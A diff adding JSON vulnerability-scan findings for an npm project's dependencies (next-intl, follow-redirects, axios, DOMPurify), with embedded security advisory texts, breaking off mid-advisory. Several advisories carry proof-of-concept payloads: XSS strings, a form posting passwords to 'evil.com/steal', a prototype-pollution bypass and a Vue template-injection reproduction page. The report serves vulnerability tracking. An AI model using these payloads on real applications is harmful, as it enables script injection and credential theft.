+                "references": "* [https://github.com/amannn/next-intl/commit/1c80b668aa6d853f470319eec10a3f61e78a70e6](https://github.com/amannn/next-intl/commit/1c80b668aa6d853f470319eec10a3f61e78a70e6)\n* [https://github.com/amannn/next-intl/pull/2304](https://github.com/amannn/next-intl/pull/2304)\n* [https://github.com/amannn/next-intl/releases/tag/v4.9.1](https://github.com/amannn/next-intl/releases/tag/v4.9.1)\n* [https://github.com/amannn/next-intl/security/advisories/GHSA-8f24-v5vv-gm5j](https://github.com/amannn/next-intl/security/advisories/GHSA-8f24-v5vv-gm5j)",
+                "cvssV4Score": 6.9,
+                "cweId": 601,
+                "description": "next-intl provides internationalization for Next.js. Applications using the `next-intl` middleware prior to version 4.9.1with `localePrefix: 'as-needed'` could construct URLs where path handling and the WHATWG URL parser resolved a relative redirect target to another host (e.g. scheme-relative `//` or control characters stripped by the URL parser), so the middleware could redirect the browser off-site while the user still started from a trusted app URL. The problem has been patchedin `next-intl@4.9.1`.",
+                "epssScore": 0.00054,
+                "source": "NVD",
+                "published": "2026-04-17 21:16:34.707",
+                "cwes": [
+                    {
+                        "cweId": 601,
+                        "name": "URL Redirection to Untrusted Site ('Open Redirect')"
+                    }
+                ],
+                "uuid": "27228620-102e-44d2-8346-92644c4aef52",
+                "severityRank": 2,
+                "cweName": "URL Redirection to Untrusted Site ('Open Redirect')",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                "epssPercentile": 0.16817
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:1a0ff72f-8ce5-4d27-ba9e-89e4e8ee11ba:27228620-102e-44d2-8346-92644c4aef52",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "follow-redirects",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/follow-redirects@1.15.11",
+                "uuid": "e10eabcb-458b-4d95-8f58-df246c57b358",
+                "version": "1.15.11",
+                "latestVersion": "1.16.0"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-14 12:14:57.951"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "GHSA-r4q5-vmmm-2653",
+                "aliases": [],
+                "references": "* [https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653](https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653)\n* [https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9](https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9)\n* [https://github.com/advisories/GHSA-r4q5-vmmm-2653](https://github.com/advisories/GHSA-r4q5-vmmm-2653)",
+                "cvssV4Score": 6.9,
+                "cweId": 200,
+                "description": "## Summary\n\nWhen an HTTP request follows a cross-domain redirect (301/302/307/308), `follow-redirects` only strips `authorization`, `proxy-authorization`, and `cookie` headers (matched by regex at index.js:469-476). Any custom authentication header (e.g., `X-API-Key`, `X-Auth-Token`, `Api-Key`, `Token`) is forwarded verbatim to the redirect target.\n\nSince `follow-redirects` is the redirect-handling dependency for **axios** (105K+ stars), this vulnerability affects the entire axios ecosystem.\n\n## Affected Code\n\n`index.js`, lines 469-476:\n\n```javascript\nif (redirectUrl.protocol !== currentUrlParts.protocol &&\n   redirectUrl.protocol !== \"https:\" ||\n   redirectUrl.host !== currentHost &&\n   !isSubdomain(redirectUrl.host, currentHost)) {\n  removeMatchingHeaders(/^(?:(?:proxy-)?authorization|cookie)$/i, this._options.headers);\n}\n```\n\nThe regex only matches `authorization`, `proxy-authorization`, and `cookie`. Custom headers like `X-API-Key` are not matched.\n\n## Attack Scenario\n\n1. App uses axios with custom auth header: `headers: { 'X-API-Key': 'sk-live-secret123' }`\n2. Server returns `302 Location: https://evil.com/steal`\n3. follow-redirects sends `X-API-Key: sk-live-secret123` to `evil.com`\n4. Attacker captures the API key\n\n## Impact\n\nAny custom auth header set via axios leaks on cross-domain redirect. Extremely common pattern. Affects all axios users in Node.js.\n\n## Suggested Fix\n\nAdd a `sensitiveHeaders` option that users can extend, or strip ALL non-standard headers on cross-domain redirect.\n\n## Disclosure\n\nSource code review, manually verified. Found 2026-03-20.",
+                "source": "GITHUB",
+                "published": "2026-04-14 01:11:11.0",
+                "title": "follow-redirects leaks Custom Authentication Headers to Cross-Domain Redirect Targets",
+                "cwes": [
+                    {
+                        "cweId": 200,
+                        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+                    }
+                ],
+                "uuid": "b5b25644-060f-455a-9465-67da1da6e22a",
+                "severityRank": 2,
+                "cweName": "Exposure of Sensitive Information to an Unauthorized Actor",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:e10eabcb-458b-4d95-8f58-df246c57b358:b5b25644-060f-455a-9465-67da1da6e22a",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "axios",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/axios@1.13.6",
+                "uuid": "4589322c-61b1-49bf-b38f-9a92cf588681",
+                "version": "1.13.6",
+                "latestVersion": "1.15.2"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-15 23:20:19.548"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 9.9,
+                "vulnId": "CVE-2025-62718",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-3p68-rc4w-qgx5",
+                        "cveId": "CVE-2025-62718"
+                    }
+                ],
+                "references": "* [https://datatracker.ietf.org/doc/html/rfc1034#section-3.1](https://datatracker.ietf.org/doc/html/rfc1034#section-3.1)\n* [https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2)\n* [https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c](https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c)\n* [https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df](https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df)\n* [https://github.com/axios/axios/pull/10661](https://github.com/axios/axios/pull/10661)\n* [https://github.com/axios/axios/pull/10688](https://github.com/axios/axios/pull/10688)\n* [https://github.com/axios/axios/releases/tag/v0.31.0](https://github.com/axios/axios/releases/tag/v0.31.0)\n* [https://github.com/axios/axios/releases/tag/v1.15.0](https://github.com/axios/axios/releases/tag/v1.15.0)\n* [https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5](https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5)",
+                "cvssV4Score": 6.3,
+                "cweId": 441,
+                "description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L",
+                "epssScore": 0.00035,
+                "source": "NVD",
+                "published": "2026-04-09 15:16:08.65",
+                "cwes": [
+                    {
+                        "cweId": 441,
+                        "name": "Unintended Proxy or Intermediary ('Confused Deputy')"
+                    },
+                    {
+                        "cweId": 918,
+                        "name": "Server-Side Request Forgery (SSRF)"
+                    }
+                ],
+                "uuid": "7a287e6d-2df0-47a7-974d-81d49e533223",
+                "severityRank": 2,
+                "cweName": "Unintended Proxy or Intermediary ('Confused Deputy')",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+                "epssPercentile": 0.10437
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:4589322c-61b1-49bf-b38f-9a92cf588681:7a287e6d-2df0-47a7-974d-81d49e533223",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "dompurify",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/dompurify@3.3.3",
+                "uuid": "c3cf13d0-de48-4aae-ad53-710da9a90825",
+                "version": "3.3.3",
+                "latestVersion": "3.4.1"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-16 11:11:53.186"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "GHSA-39q2-94rc-95cp",
+                "aliases": [],
+                "references": "* [https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp](https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp)\n* [https://github.com/advisories/GHSA-39q2-94rc-95cp](https://github.com/advisories/GHSA-39q2-94rc-95cp)",
+                "cvssV4Score": 5.3,
+                "cweId": 783,
+                "description": "## Summary\nIn `src/purify.ts:1117-1123`, `ADD_TAGS` as a function (via `EXTRA_ELEMENT_HANDLING.tagCheck`) bypasses `FORBID_TAGS` due to short-circuit evaluation.\n\nThe condition:\n```\n!(tagCheck(tagName)) && (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])\n```\nWhen `tagCheck(tagName)` returns `true`, the entire condition is `false` and the element is kept \u2014 `FORBID_TAGS[tagName]` is never evaluated.\n\n## Inconsistency\nThis contradicts the attribute-side pattern at line 1214 where `FORBID_ATTR` explicitly wins first:\n```\nif (FORBID_ATTR[lcName]) { continue; }\n```\nFor tags, FORBID should also take precedence over ADD.\n\n## Impact\nApplications using both `ADD_TAGS` as a function and `FORBID_TAGS` simultaneously get unexpected behavior \u2014 forbidden tags are allowed through. Config-dependent but a genuine logic inconsistency.\n\n## Suggested Fix\nCheck `FORBID_TAGS` before `tagCheck`:\n```\nif (FORBID_TAGS[tagName]) { /* remove */ }\nelse if (tagCheck(tagName) || ALLOWED_TAGS[tagName]) { /* keep */ }\n```\n\n## Affected Version\nv3.3.3 (commit 883ac15)",
+                "source": "GITHUB",
+                "published": "2026-04-16 00:46:35.0",
+                "title": "DOMPurify's ADD_TAGS function form bypasses FORBID_TAGS due to short-circuit evaluation",
+                "cwes": [
+                    {
+                        "cweId": 783,
+                        "name": "Operator Precedence Logic Error"
+                    }
+                ],
+                "uuid": "84e708ba-e52d-4467-ab28-92f8af65e560",
+                "severityRank": 2,
+                "cweName": "Operator Precedence Logic Error",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:c3cf13d0-de48-4aae-ad53-710da9a90825:84e708ba-e52d-4467-ab28-92f8af65e560",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "follow-redirects",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/follow-redirects@1.15.11",
+                "uuid": "e10eabcb-458b-4d95-8f58-df246c57b358",
+                "version": "1.15.11",
+                "latestVersion": "1.16.0"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-22 23:25:12.153"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 7.5,
+                "vulnId": "CVE-2026-40895",
+                "aliases": [],
+                "references": "* [https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653](https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653)",
+                "cvssV4Score": 6.9,
+                "cweId": 200,
+                "description": "follow-redirects is an open source, drop-in replacement for Node's `http` and `https` modules that automatically follows redirects. Prior to 1.16.0, when an HTTP request follows a cross-domain redirect (301/302/307/308), follow-redirects only strips authorization, proxy-authorization, and cookie headers (matched by regex at index.js). Any custom authentication header (e.g., X-API-Key, X-Auth-Token, Api-Key, Token) is forwarded verbatim to the redirect target. This vulnerability is fixed in 1.16.0.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                "epssScore": 0.00042,
+                "source": "NVD",
+                "published": "2026-04-21 21:16:44.337",
+                "cwes": [
+                    {
+                        "cweId": 200,
+                        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+                    }
+                ],
+                "uuid": "aa836a97-5cb0-401b-b230-efcf4e457886",
+                "severityRank": 2,
+                "cweName": "Exposure of Sensitive Information to an Unauthorized Actor",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+                "epssPercentile": 0.12816
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:e10eabcb-458b-4d95-8f58-df246c57b358:aa836a97-5cb0-401b-b230-efcf4e457886",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "dompurify",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/dompurify@3.3.3",
+                "uuid": "c3cf13d0-de48-4aae-ad53-710da9a90825",
+                "version": "3.3.3",
+                "latestVersion": "3.4.1"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-22 23:25:18.21"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "GHSA-h7mw-gpvr-xq4m",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-h7mw-gpvr-xq4m",
+                        "cveId": "CVE-2026-41240"
+                    }
+                ],
+                "references": "* [https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m](https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m)\n* [https://github.com/cure53/DOMPurify/releases/tag/3.4.0](https://github.com/cure53/DOMPurify/releases/tag/3.4.0)\n* [https://github.com/advisories/GHSA-h7mw-gpvr-xq4m](https://github.com/advisories/GHSA-h7mw-gpvr-xq4m)",
+                "cvssV4Score": 6,
+                "cweId": 79,
+                "description": "There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.\n\nCommit [c361baa](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80) added an early exit for FORBID_ATTR at line 1214:\n\n    /* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */\n    if (FORBID_ATTR[lcName]) {\n      return false;\n    }\n\nThe same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:\n\n    if (\n      !(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -> short-circuits\n      ) &&\n      (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated\n    ) {\n\nThis allows forbidden elements to survive sanitization with their attributes intact.\n\nPoC (tested against current HEAD in Node.js + jsdom):\n\n    const DOMPurify = createDOMPurify(window);\n\n    DOMPurify.sanitize(\n      '<iframe src=\"https://evil.com\"><\/iframe>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['iframe']\n      }\n    );\n    // Returns: '<iframe src=\"https://evil.com\"><\/iframe>'\n    // Expected: '' (iframe forbidden)\n\n    DOMPurify.sanitize(\n      '<form action=\"https://evil.com/steal\"><input name=password><\/form>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['form']\n      }\n    );\n    // Returns: '<form action=\"https://evil.com/steal\"><input name=\"password\"><\/form>'\n    // Expected: '<input name=\"password\">' (form forbidden)\n\nConfirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.\n\nCompare with FORBID_ATTR which correctly wins:\n\n    DOMPurify.sanitize(\n      '<p onclick=\"alert(1)\">hello<\/p>',\n      {\n        ADD_ATTR: function(attr) { return true; },\n        FORBID_ATTR: ['onclick']\n      }\n    );\n    // Returns: '<p>hello<\/p>' (onclick correctly removed)\n\nSuggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:\n\n    /* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */\n    if (FORBID_TAGS[tagName]) {\n      // proceed to removal logic\n    }\n\nThis requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.\n\nReporter: Koda Reef",
+                "source": "GITHUB",
+                "published": "2026-04-22 17:34:17.0",
+                "title": "DOMPurify: FORBID_TAGS bypassed by function-based ADD_TAGS predicate (asymmetry with FORBID_ATTR fix)",
+                "cwes": [
+                    {
+                        "cweId": 79,
+                        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                    },
+                    {
+                        "cweId": 183,
+                        "name": "Permissive List of Allowed Inputs"
+                    }
+                ],
+                "uuid": "76f9e793-48e0-40fd-9c2c-bfb60a48add1",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:c3cf13d0-de48-4aae-ad53-710da9a90825:76f9e793-48e0-40fd-9c2c-bfb60a48add1",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "dompurify",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/dompurify@3.3.3",
+                "uuid": "c3cf13d0-de48-4aae-ad53-710da9a90825",
+                "version": "3.3.3",
+                "latestVersion": "3.4.1"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-22 23:25:18.259"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 6.9,
+                "vulnId": "GHSA-v9jr-rg53-9pgp",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-v9jr-rg53-9pgp",
+                        "cveId": "CVE-2026-41238"
+                    }
+                ],
+                "references": "* [https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp](https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp)\n* [https://github.com/cure53/DOMPurify/releases/tag/3.4.0](https://github.com/cure53/DOMPurify/releases/tag/3.4.0)\n* [https://github.com/advisories/GHSA-v9jr-rg53-9pgp](https://github.com/advisories/GHSA-v9jr-rg53-9pgp)",
+                "cweId": 79,
+                "description": "## Summary\n\nDOMPurify versions 3.0.1 through 3.3.3 (latest) are vulnerable to a prototype pollution-based XSS bypass. When an application uses `DOMPurify.sanitize()` with the default configuration (no `CUSTOM_ELEMENT_HANDLING` option), a prior prototype pollution gadget can inject permissive `tagNameCheck` and `attributeNameCheck` regex values into `Object.prototype`, causing DOMPurify to allow arbitrary custom elements with arbitrary attributes \u2014 including event handlers \u2014 through sanitization.\n\n## Affected Versions\n\n- **3.0.1 through 3.3.3** (current latest) \u2014 all affected\n- **3.0.0 and all 2.x versions** \u2014 NOT affected (used `Object.create(null)` for initialization, no `|| {}` reassignment)\n- The vulnerable `|| {}` reassignment was introduced in the 3.0.0→3.0.1 refactor\n- This is **distinct** from GHSA-cj63-jhhr-wcxv (USE_PROFILES Array.prototype pollution, fixed in 3.3.2)\n- This is **distinct** from CVE-2024-45801 / GHSA-mmhx-hmjr-r674 (__depth prototype pollution, fixed in 3.1.3)\n\n## Root Cause\n\nIn `purify.js` at line 590, during config parsing:\n\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nWhen no `CUSTOM_ELEMENT_HANDLING` is specified in the config (the default usage pattern), `cfg.CUSTOM_ELEMENT_HANDLING` is `undefined`, and the fallback `{}` is used. This plain object inherits from `Object.prototype`.\n\nLines 591-598 then check `cfg.CUSTOM_ELEMENT_HANDLING` (the original config property) \u2014 which is `undefined` \u2014 so the conditional blocks that would set `tagNameCheck` and `attributeNameCheck` from the config are never entered.\n\nAs a result, `CUSTOM_ELEMENT_HANDLING.tagNameCheck` and `CUSTOM_ELEMENT_HANDLING.attributeNameCheck` resolve via the prototype chain. If an attacker has polluted `Object.prototype.tagNameCheck` and `Object.prototype.attributeNameCheck` with permissive values (e.g., `/.*/`), these polluted values flow into DOMPurify's custom element validation at lines 973-977 and attribute validation, causing all custom elements and all attributes to be allowed.\n\n## Impact\n\n- **Attack type:** XSS bypass via prototype pollution chain\n- **Prerequisites:** Attacker must have a prototype pollution primitive in the same execution context (e.g., vulnerable version of lodash, jQuery.extend, query-string parser, deep merge utility, or any other PP gadget)\n- **Config required:** Default. No special DOMPurify configuration needed. The standard `DOMPurify.sanitize(userInput)` call is affected.\n- **Payload:** Any HTML custom element (name containing a hyphen) with event handler attributes survives sanitization\n\n## Proof of Concept\n\n```javascript\n// Step 1: Attacker exploits a prototype pollution gadget elsewhere in the application\nObject.prototype.tagNameCheck = /.*/;\nObject.prototype.attributeNameCheck = /.*/;\n\n// Step 2: Application sanitizes user input with DEFAULT config\nconst clean = DOMPurify.sanitize('<x-x onfocus=alert(document.cookie) tabindex=0 autofocus>');\n\n// Step 3: \"Sanitized\" output still contains the event handler\nconsole.log(clean);\n// Output: <x-x onfocus=\"alert(document.cookie)\" tabindex=\"0\" autofocus=\"\">\n\n// Step 4: When injected into DOM, XSS executes\ndocument.body.innerHTML = clean; // alert() fires\n```\n\n### Tested configurations that are vulnerable:\n\n| Call Pattern | Vulnerable? |\n|---|---|\n| `DOMPurify.sanitize(input)` | YES |\n| `DOMPurify.sanitize(input, {})` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: null })` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: {} })` | NO (explicit object triggers L591 path) |\n\n## Suggested Fix\n\nChange line 590 from:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nTo:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || create(null);\n```\n\nThe `create(null)` function (already used elsewhere in DOMPurify, e.g., in `clone()`) creates an object with no prototype, preventing prototype chain inheritance.\n\n### Alternative application-level mitigation:\n\nApplications can protect themselves by always providing an explicit `CUSTOM_ELEMENT_HANDLING` in their config:\n\n```javascript\nDOMPurify.sanitize(input, {\n  CUSTOM_ELEMENT_HANDLING: {\n    tagNameCheck: null,\n    attributeNameCheck: null\n  }\n});\n```\n\n## Timeline\n\n- **2026-04-04:** Vulnerability discovered during automated DOMPurify fuzzing research (Fermat project)\n- **2026-04-04:** Confirmed in Chrome browser with DOMPurify 3.3.3\n- **2026-04-04:** Verified distinct from GHSA-cj63-jhhr-wcxv and CVE-2024-45801\n- **2026-04-04:** Advisory drafted, responsible disclosure initiated\n\n## Credit\n\nhttps://github.com/trace37labs",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N",
+                "source": "GITHUB",
+                "published": "2026-04-22 17:31:32.0",
+                "title": "DOMPurify: Prototype Pollution to XSS Bypass via CUSTOM_ELEMENT_HANDLING Fallback",
+                "cwes": [
+                    {
+                        "cweId": 79,
+                        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                    },
+                    {
+                        "cweId": 1321,
+                        "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+                    }
+                ],
+                "uuid": "ffaa8bbf-c761-46e5-bfb1-b50cfbb7a907",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:c3cf13d0-de48-4aae-ad53-710da9a90825:ffaa8bbf-c761-46e5-bfb1-b50cfbb7a907",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "dompurify",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/dompurify@3.3.3",
+                "uuid": "c3cf13d0-de48-4aae-ad53-710da9a90825",
+                "version": "3.3.3",
+                "latestVersion": "3.4.1"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-22 23:25:18.308"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 6.8,
+                "vulnId": "GHSA-crv5-9vww-q3g8",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-crv5-9vww-q3g8",
+                        "cveId": "CVE-2026-41239"
+                    }
+                ],
+                "references": "* [https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8](https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8)\n* [https://github.com/cure53/DOMPurify/releases/tag/3.4.0](https://github.com/cure53/DOMPurify/releases/tag/3.4.0)\n* [https://github.com/advisories/GHSA-crv5-9vww-q3g8](https://github.com/advisories/GHSA-crv5-9vww-q3g8)",
+                "cweId": 79,
+                "description": "## Summary\n\n| Field | Value |\n|:------|:------|\n| **Severity** | Medium |\n| **Affected** | DOMPurify `main` at [`883ac15`](https://github.com/cure53/DOMPurify/tree/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6), introduced in v1.0.10 ([`7fc196db`](https://github.com/cure53/DOMPurify/commit/7fc196db0b42a0c360262dba0cc39c9c91bfe1ec)) |\n\n`SAFE_FOR_TEMPLATES` strips `{{...}}` expressions from untrusted HTML. This works in string mode but not with `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, allowing XSS via template-evaluating frameworks like Vue 2.\n\n## Technical Details\n\nDOMPurify strips template expressions in two passes:\n\n1. **Per-node** \u2014 each text node is checked during the tree walk ([`purify.ts:1179-1191`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1179-L1191)):\n\n```js\n// pass #1: runs on every text node during tree walk\nif (SAFE_FOR_TEMPLATES && currentNode.nodeType === NODE_TYPE.text) {\n  content = currentNode.textContent;\n  content = content.replace(MUSTACHE_EXPR, ' ');  // {{...}} -> ' '\n  content = content.replace(ERB_EXPR, ' ');        // <%...%> -> ' '\n  content = content.replace(TMPLIT_EXPR, ' ');      // ${...  -> ' '\n  currentNode.textContent = content;\n}\n```\n\n2. **Final string scrub** \u2014 after serialization, the full HTML string is scrubbed again ([`purify.ts:1679-1683`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1679-L1683)). This is the safety net that catches expressions that only form after the DOM settles.\n\nThe `RETURN_DOM` path returns before pass #2 ever runs ([`purify.ts:1637-1661`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1637-L1661)):\n\n```js\n// purify.ts (simplified)\n\nif (RETURN_DOM) {\n  // ... build returnNode ...\n  return returnNode;        // <-- exits here, pass #2 never runs\n}\n\n// pass #2: only reached by string-mode callers\nif (SAFE_FOR_TEMPLATES) {\n  serializedHTML = serializedHTML.replace(MUSTACHE_EXPR, ' ');\n}\nreturn serializedHTML;\n```\n\nThe payload `{<foo><\/foo>{constructor.constructor('alert(1)')()}<foo><\/foo>}` exploits this:\n\n1. Parser creates: `TEXT(\"{\")` → `<foo>` → `TEXT(\"{payload}\")` → `<foo>` → `TEXT(\"}\")` \u2014 no single node contains `{{`, so pass #1 misses it\n2. `<foo>` is not allowed, so DOMPurify removes it but keeps surrounding text\n3. The three text nodes are now adjacent \u2014 `.outerHTML` reads them as `{{payload}}`, which Vue 2 compiles and executes\n\n## Reproduce\n\nOpen the following html in any browser and `alert(1)` pops up.\n\n```html\n<!DOCTYPE html>\n<html>\n\n<body>\n  <script src=\"https://cdn.jsdelivr.net/npm/dompurify@3.3.3/dist/purify.min.js\"><\/script>\n  <script src=\"https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js\"><\/script>\n  <script>\n    var dirty = '<div id=\"app\">{<foo><\/foo>{constructor.constructor(\"alert(1)\")()}<foo><\/foo>}<\/div>';\n    var dom = DOMPurify.sanitize(dirty, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true });\n    document.body.appendChild(dom.firstChild);\n    new Vue({ el: '#app' });\n  <\/script>\n<\/body>\n\n<\/html>\n```\n\n## Impact\n\nAny application that sanitizes attacker-controlled HTML with `SAFE_FOR_TEMPLATES: true` and `RETURN_DOM: true` (or `RETURN_DOM_FRAGMENT: true`), then mounts the result into a template-evaluating 